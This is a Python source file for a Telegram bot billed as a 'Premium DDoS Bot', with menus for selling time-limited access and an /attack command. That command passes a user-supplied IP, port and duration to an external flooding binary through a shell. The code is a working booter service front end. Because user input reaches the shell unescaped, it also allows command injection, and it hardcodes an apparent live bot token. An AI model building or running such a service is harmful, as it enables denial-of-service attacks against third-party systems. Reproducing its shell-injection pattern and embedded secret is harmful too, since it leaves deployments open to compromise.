import telebot
import datetime
import random
import logging
import subprocess
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Initialize the bot with your bot's API token
bot = telebot.TeleBot('8062201499:AAEj0Z13mMlJJF0NiHXKVWXtXFTfdyYhUyY')

# Admin user IDs (replace with your own admin IDs as strings)
admin_ids = ["6710024903"]

# File to store allowed user IDs with expiry dates
USER_FILE = "users.txt"

# Dictionary to store allowed users with expiry dates
allowed_users = {}

# Dictionary to store last attack times for each user
user_last_attack_time = {}

# Variable to manage admin add state
admin_add_state = {}

# Dictionary to store user navigation history (stack-based)
user_navigation_history = {}

# Read user IDs and expiry dates from the file
def read_users():
    users = {}
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                parts = line.strip().split(',')
                if len(parts) == 2:
                    user_id, expiry_str = parts
                    expiry_date = datetime.datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
                    users[user_id] = expiry_date
    except FileNotFoundError:
        pass
    return users

# Write user IDs and expiry dates to the file
def write_users(users):
    with open(USER_FILE, "w") as file:
        for user_id, expiry_date in users.items():
            file.write(f"{user_id},{expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n")

# Load users at startup
allowed_users = read_users()

# Function to create main reply markup with buttons
def create_main_reply_markup(user_id):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton(' 𝘼𝙩𝙩𝙖𝙘𝙠 🚀'),
        KeyboardButton('ℹ️ 𝙈𝙮 𝙄𝙣𝙛𝙤'),
        KeyboardButton('📄 𝙎𝙝𝙤𝙬 𝙃𝙚𝙡𝙥𝙨'),
        KeyboardButton('🔑 𝘼𝙘𝙘𝙚𝙨𝙨')
    )
    if user_id in admin_ids:
        markup.add(KeyboardButton('🔒𝘼𝘿𝙈𝙄𝙉'))
    return markup

# Function to create admin reply markup with add/remove buttons
def create_admin_reply_markup():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton('➕ 𝘼𝘿𝘿 𝙐𝙎𝙀𝙍'),
        KeyboardButton('➖ 𝙍𝙀𝙈𝙊𝙑𝙀 𝙐𝙎𝙀𝙍'),
        KeyboardButton('⬅️ 𝘽𝘼𝘾𝙆')
    )
    return markup

# Function to create duration selection markup
def create_duration_markup():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        KeyboardButton('1 𝘿𝘼𝙔'),
        KeyboardButton('7 𝘿𝘼𝙔𝙎'),
        KeyboardButton('1 𝙈𝙊𝙉𝙏𝙃'),
        KeyboardButton('⬅️ 𝘽𝘼𝘾𝙆')
    )
    return markup

# Function to create dynamic user list for removal
def create_user_removal_markup():
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    for user_id in allowed_users:
        markup.add(KeyboardButton(user_id))
    markup.add(KeyboardButton('⬅️ 𝐁𝐚𝐜𝐤'))
    return markup

# Helper function to update user navigation history
def update_navigation_history(user_id, markup):
    if user_id not in user_navigation_history:
        user_navigation_history[user_id] = []
    user_navigation_history[user_id].append(markup)

# Helper function to get last navigation state
def get_last_navigation(user_id):
    if user_id in user_navigation_history and user_navigation_history[user_id]:
        return user_navigation_history[user_id].pop()
    return None

# Function to log commands (stub for logging, implement as needed)
def log_command(user_id, target, port, duration):
    # Add your logging logic here
    pass

# Function to handle the /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = str(message.chat.id)
    markup = create_main_reply_markup(user_id)
    update_navigation_history(user_id, markup)
    bot.send_message(message.chat.id, "𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙎𝙋𝙄𝘿𝙔𝙓𝘽𝙀𝘼𝙎𝙏 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘿𝘿𝙤𝙎 𝘽𝙤𝙩 𝘾𝙝𝙤𝙤𝙨𝙚 𝘼𝙣 𝙊𝙥𝙩𝙞𝙤𝙣 𝙏𝙤 𝙐𝙨𝙚 𝘽𝙤𝙩......", reply_markup=markup)

# Handle "My Info" button
@bot.message_handler(func=lambda message: message.text == 'ℹ️ 𝙈𝙮 𝙄𝙣𝙛𝙤 ')
def my_info_command(message):
    user_id = str(message.chat.id)
    username = message.from_user.username if message.from_user.username else "𝙉𝙤 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚"
    role = "𝘼𝙙𝙢𝙞𝙣" if user_id in admin_ids else "𝙐𝙎𝙀𝙍"
    
    if user_id in allowed_users:
        expiry_date = allowed_users[user_id]
        response = (f"👤 𝐔𝐬𝐞𝐫 𝐈𝐧𝐟𝐨 👤\n\n"
                    f"🔖 𝐑𝐨𝐥𝐞: {role}\n"
                    f"🆔 𝐔𝐬𝐞𝐫 𝐈𝐃: {user_id}\n"
                    f"👤 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n"
                    f"📅 𝐄𝐱𝐩𝐢𝐫𝐲 𝐃𝐚𝐭𝐞: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n")
    else:
        response = (f"👤 𝐔𝐬𝐞𝐫 𝐢𝐧𝐟𝐨 👤\n\n"
                    f"🔖 𝐑𝐨𝐥𝐞: {role}\n"
                    f"🆔 𝐔𝐬𝐞𝐫 𝐈𝐃: {user_id}\n"
                    f"👤 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞: @{username}\n"
                    f"⚠️ 𝐄𝐱𝐩𝐢𝐫𝐲 𝐃𝐚𝐭𝐞: 𝐍𝐨𝐭 𝐚𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞\n")
    
    bot.reply_to(message, response)

# Handle attack command
@bot.message_handler(commands=['attack'])
def handle_attack_command(message):
    user_id = str(message.chat.id)
    if user_id in allowed_users:
        try:
            parts = message.text.split()[1:]  # Ignore the command part
            if len(parts) == 3:
                target_ip, target_port, duration = parts[0], int(parts[1]), int(parts[2])

                if duration > 300:
                    bot.reply_to(message, "𝙀𝙧𝙧𝙤𝙧 𝙔𝙤𝙪 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙊𝙣𝙡𝙮 300 𝘽𝙘𝙯 𝙊𝙬𝙣𝙚𝙧 𝙉𝙤𝙩 𝘼𝙡𝙡𝙤𝙬 𝙏𝙤 𝙪𝙨𝙚 𝘼𝙗𝙤𝙫𝙚 300.")
                    return

                # Handle cooldown for non-admin users
                current_time = datetime.datetime.now()
                if user_id in user_last_attack_time:
                    last_attack_time = user_last_attack_time[user_id]
                    time_since_last_attack = (current_time - last_attack_time).total_seconds()
                    if user_id not in admin_ids and time_since_last_attack < 10:
                        cooldown_time = int(10 - time_since_last_attack)
                        bot.reply_to(message, f"𝙉𝙊𝙒 𝙔𝙊𝙐 𝘾𝘼𝙉 𝘼𝙉𝙊𝙏𝙃𝙀𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 {cooldown_time} seconds.")
                        return

                user_last_attack_time[user_id] = current_time

                bot.reply_to(message, "𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿")
                bot.reply_to(message, f"🚀 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 𝙒𝙊𝙍𝙆𝙄𝙉𝙂 𝙋𝙍𝙊𝙋𝙀𝙍𝙇𝙔! 🚀\n\n 𝐓𝐚𝐫𝐠𝐞𝐭 𝐈𝐏: {target_ip}, \n𝐏𝐨𝐫𝐭: {target_port}, \n𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration}")

                log_command(user_id, target_ip, target_port, duration)

                # Simulate the attack command (replace with actual command if needed)
                full_command = f"./spidy {target_ip} {target_port} {duration}"
                subprocess.run(full_command, shell=True)

                bot.reply_to(message, f"🚀 𝐀𝐭𝐭𝐚𝐜𝐤 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝. 🚀 \n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target_ip}\n𝐏𝐨𝐫𝐭: {target_port}\n𝐓𝐢𝐦𝐞: {duration}")
            else:
                bot.reply_to(message, "𝙉𝙊𝙒 𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 :- /attack <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧>")
        except ValueError:
            bot.reply_to(message, "𝙄𝙉𝙑𝘼𝙇𝙄𝘿 𝘾𝙊𝙈𝙈𝘼𝘿𝙎 𝙁𝙊𝙍𝙈𝘼𝙏 𝙋𝙊𝙍𝙏 𝘼𝙉𝘿 𝙔𝙄𝙈𝙀 𝙈𝙐𝙎𝙏 𝘽𝙀 𝙄𝙈𝙏𝙀𝙂𝙀𝙍𝙎.")
    else:
        bot.reply_to(message, "𝙊𝙉𝙇𝙔 𝘼𝘿𝙈𝙄𝙉 𝘾𝘼𝙉 𝘿𝙊 𝙏𝙃𝙄𝙎 𝙔𝙊𝙐 𝘾𝘼𝙉 𝙉𝙊𝙏 𝘿𝙊 𝙏𝙃𝙄𝙎 𝘽𝘾𝙕 𝙔𝙊𝙐𝘽𝘼𝙍𝙀 𝙉𝙊𝙊𝘽!!")

# Handle "Attack" button
@bot.message_handler(func=lambda message: message.text == ' 𝘼𝙩𝙩𝙖𝙘𝙠 🚀')
def prompt_attack_command(message):
    bot.reply_to(message, "𝐏𝙐𝙎𝙀 𝙏𝙃𝙄𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿 𝙁𝙊𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 /attack {ip} {port} {Duration in sec}")

# Handle "Show Help" button
@bot.message_handler(func=lambda message: message.text == '📄 𝙎𝙝𝙤𝙬 𝙃𝙚𝙡𝙥𝙨')
def send_help_text(message):
    help_text = '''𝘊𝘖𝘔𝘔𝘈𝘕𝘋𝘚 𝘍𝘖𝘙 𝘜𝘚𝘌𝘙𝘚:
- . 𝘼𝙩𝙩𝙖𝙘𝙠 🚀 𝘍𝘖𝘙 𝘈𝘛𝘛𝘈𝘊𝘒𝘚 
- ℹ️ 𝐌𝐲 𝐢𝐧𝐟𝐨: 𝘝𝘪𝘦𝘸 𝘠𝘰𝘶𝘳𝘴 𝘐𝘯𝘧𝘰𝘳𝘮𝘢𝘵𝘪𝘰𝘮𝘴
- 𝐀𝐧𝐲 𝐈𝐬𝐬𝐮𝐞𝐬 : 𝐃𝐦 : @SPIDY_OWNEROP
'''
    bot.send_message(message.chat.id, help_text)

# Handle "For Access" button
@bot.message_handler(func=lambda message: message.text == '🔑 𝘼𝙘𝙘𝙚𝙨𝙨')
def send_access_text(message):
    access_text = '𝘉𝘖𝘛 𝘗𝘈𝘐𝘋 𝘈𝘊𝘊𝘌𝘚𝘚 𝘋𝘔 𝘛𝘖 𝘖𝘞𝘕𝘌𝘙  @SPIDY_OWNEROP'
    bot.send_message(message.chat.id, access_text)

# Handle "Admin Only" button
@bot.message_handler(func=lambda message: message.text == '🔒𝘼𝘿𝙈𝙄𝙉')
def admin_only_menu(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        markup = create_admin_reply_markup()
        update_navigation_history(user_id, markup)
        bot.send_message(message.chat.id, "𝘼𝙙𝙢𝙞𝙣 𝙈𝙚𝙣𝙪:", reply_markup=markup)
    else:
        bot.reply_to(message, "𝘺𝘰𝘶 𝘤𝘢𝘯 𝘵𝘰 𝘥𝘰 𝘛𝘣𝘪𝘴 𝘔𝘺 𝘚𝘰𝘯!.")

# Handle "Add User" button in admin menu
@bot.message_handler(func=lambda message: message.text == '➕ 𝘼𝘿𝘿 𝙐𝙎𝙀𝙍')
def add_user_button(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        markup = create_duration_markup()
        admin_add_state[user_id] = {'step': 'select_duration'}
        update_navigation_history(user_id, markup)
        bot.send_message(message.chat.id, "𝙎𝙚𝙡𝙚𝙘𝙩 𝙏𝙝𝙚 𝘼𝙘𝙘𝙚𝙨𝙨 𝙞𝙣 𝘿𝙪𝙧𝙖𝙩𝙞𝙤𝙣𝙨 𝙁𝙤𝙧 𝙏𝙝𝙚 𝙉𝙚𝙬 𝙐𝙨𝙚𝙧𝙨", reply_markup=markup)
    else:
        bot.reply_to(message, "𝙔𝙤𝙪 𝙘𝙖𝙣 𝙉𝙤𝙩 𝘿𝙤 𝙩𝙝𝙞𝙨 𝙈𝙮 𝙎𝙤𝙣")

# Handle duration selection for adding a user
@bot.message_handler(func=lambda message: str(message.chat.id) in admin_add_state and admin_add_state[str(message.chat.id)]['step'] == 'select_duration')
def select_duration(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids and message.text in ['1 𝐃𝐚𝐲', '7 𝐃𝐚𝐲𝐬', '1 𝐌𝐨𝐧𝐭𝐡']:
        duration = message.text
        admin_add_state[user_id] = {'step': 'enter_user_id', 'duration': duration}
        bot.send_message(message.chat.id, f"𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧 '{duration}' 𝐬𝐞𝐥𝐞𝐜𝐭𝐞𝐝. 𝐍𝐨𝐰, 𝐩𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐭𝐡𝐞 𝐮𝐬𝐞𝐫 𝐈𝐃 𝐭𝐨 𝐚𝐝𝐝:")
    else:
        bot.reply_to(message, "𝐈𝐧𝐯𝐚𝐢𝐥𝐞𝐝 𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧 𝐬𝐞𝐥𝐞𝐜𝐭𝐞𝐝 𝐨𝐫 𝐮𝐧𝐨𝐭𝐡𝐚𝐫𝐢𝐞𝐬𝐝 𝐚𝐜𝐭𝐢𝐨𝐧.")

# Handle user ID input after selecting duration
@bot.message_handler(func=lambda message: str(message.chat.id) in admin_add_state and admin_add_state[str(message.chat.id)]['step'] == 'enter_user_id')
def add_user_after_duration(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        new_user_id = message.text.strip()
        duration = admin_add_state[user_id]['duration']

        # Calculate expiry date based on the selected duration
        if duration == '1 𝐃𝐚𝐲':
            expiry_date = datetime.datetime.now() + datetime.timedelta(days=1)
        elif duration == '7 𝐃𝐚𝐲𝐬':
            expiry_date = datetime.datetime.now() + datetime.timedelta(days=7)
        elif duration == '1 𝐌𝐨𝐧𝐭𝐡':
            expiry_date = datetime.datetime.now() + datetime.timedelta(days=30)

        # Add the new user with the selected expiry date
        allowed_users[new_user_id] = expiry_date
        write_users(allowed_users)

        # Clear the admin state for this user
        del admin_add_state[user_id]

        bot.reply_to(message, f"𝐔𝐬𝐞𝐫 {new_user_id} 𝐚𝐝𝐝𝐞𝐝 𝐰𝐢𝐭𝐡 𝐚𝐜𝐜𝐞𝐬𝐬 𝐟𝐨𝐫 {duration}.")
    else:
        bot.reply_to(message, "𝐓𝐞𝐫𝐢 𝐡𝐢𝐦𝐦𝐚𝐭 𝐧𝐡𝐢 𝐡𝐚 𝐮𝐬𝐞𝐫𝐬 𝐤𝐨 𝐚𝐝𝐝 𝐤𝐚𝐫 𝐧 𝐤𝐢.")

# Handle "Remove User" button in admin menu
@bot.message_handler(func=lambda message: message.text == '➖ 𝐑𝐞𝐦𝐨𝐯𝐞 𝐔𝐬𝐞𝐫')
def remove_user_button(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        if allowed_users:
            markup = create_user_removal_markup()
            update_navigation_history(user_id, markup)
            bot.send_message(message.chat.id, "𝐒𝐞𝐥𝐞𝐜𝐭 𝐚 𝐮𝐬𝐞𝐫 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞:", reply_markup=markup)
        else:
            bot.send_message(message.chat.id, "𝐍𝐨 𝐮𝐬𝐞𝐫𝐬 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞.")
    else:
        bot.reply_to(message, "𝙔𝙊𝙐 𝘾𝘼𝙉 𝙉𝙊𝙏 𝘿𝙊 𝙏𝙃𝙄𝙎 𝙈𝙔 𝘿𝙄𝘾𝙆")

# Handle dynamic user removal
@bot.message_handler(func=lambda message: message.text in allowed_users)
def remove_user_dynamic(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        user_to_remove = message.text
        if user_to_remove in allowed_users:
            del allowed_users[user_to_remove]
            write_users(allowed_users)
            bot.reply_to(message, f"𝐔𝐬𝐞𝐫 {user_to_remove} 𝐫𝐞𝐦𝐨𝐯𝐞𝐝 𝐬𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲.")
            
            # Show updated list or go back to admin menu if empty
            if allowed_users:
                markup = create_user_removal_markup()
                update_navigation_history(user_id, markup)
                bot.send_message(message.chat.id, "𝙎𝙀𝙇𝙀𝘾𝙏 𝘼𝙉𝙊𝙏𝙃𝙀𝙍 𝙐𝙎𝙀𝙍 𝙏𝙊 𝙍𝙀𝙈𝙊𝙑𝙀 𝙁𝙊𝙍 𝘽𝙊𝙏:", reply_markup=markup)
            else:
                markup = create_admin_reply_markup()
                update_navigation_history(user_id, markup)
                bot.send_message(message.chat.id, "𝐍𝐨 𝐦𝐨𝐫𝐞 𝐮𝐬𝐞𝐫𝐬 𝐭𝐨 𝐫𝐞𝐦𝐨𝐯𝐞. 𝐁𝐚𝐜𝐤 𝐭𝐨 𝐀𝐝𝐦𝐢𝐧 𝐌𝐞𝐧𝐮:", reply_markup=markup)
        else:
            bot.reply_to(message, f"𝐔𝐬𝐞𝐫 {user_to_remove} 𝐧𝐨𝐭 𝐟𝐨𝐮𝐧𝐝.")
    else:
        bot.reply_to(message, "𝙔𝙊𝙔 𝘾𝘼𝙉 𝙉𝙊𝙏 𝘿𝙊 𝙏𝙃𝙄𝙎 𝙈𝙔 𝙎𝙊𝙉")

# Handle "Back" button
@bot.message_handler(func=lambda message: message.text == '⬅️ 𝐁𝐚𝐜𝐤')
def back_to_last_menu(message):
    user_id = str(message.chat.id)
    last_markup = get_last_navigation(user_id)
    if last_markup:
        bot.send_message(message.chat.id, "𝐁𝐚𝐜𝐤 𝐭𝐨 𝐩𝐫𝐞𝐯𝐨𝐢𝐮𝐬 𝐦𝐞𝐧𝐮:", reply_markup=last_markup)
    else:
        markup = create_main_reply_markup(user_id)
        bot.send_message(message.chat.id, "𝐁𝐚𝐜𝐤 𝐭𝐨 𝐦𝐚𝐢𝐧 𝐦𝐞𝐧𝐮:", reply_markup=markup)

# Start the bot
if __name__ == "__main__":
    logging.info("𝙉𝙊𝙒 𝙎𝙋𝙄𝘿𝙀𝙔 𝘽𝙊𝙏 𝙄𝙎 𝙉𝙊𝙒 𝙍𝙐𝙉𝙉𝙄𝙉𝙂 𝙂𝙊 𝙄𝙉 𝙏𝙀𝙇𝙀𝙂𝙍𝘼𝙈 𝘼𝙉𝘿 𝙀𝙉𝙅𝙊𝙔 ")
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        logging.error(f"An error occurred: {e}")
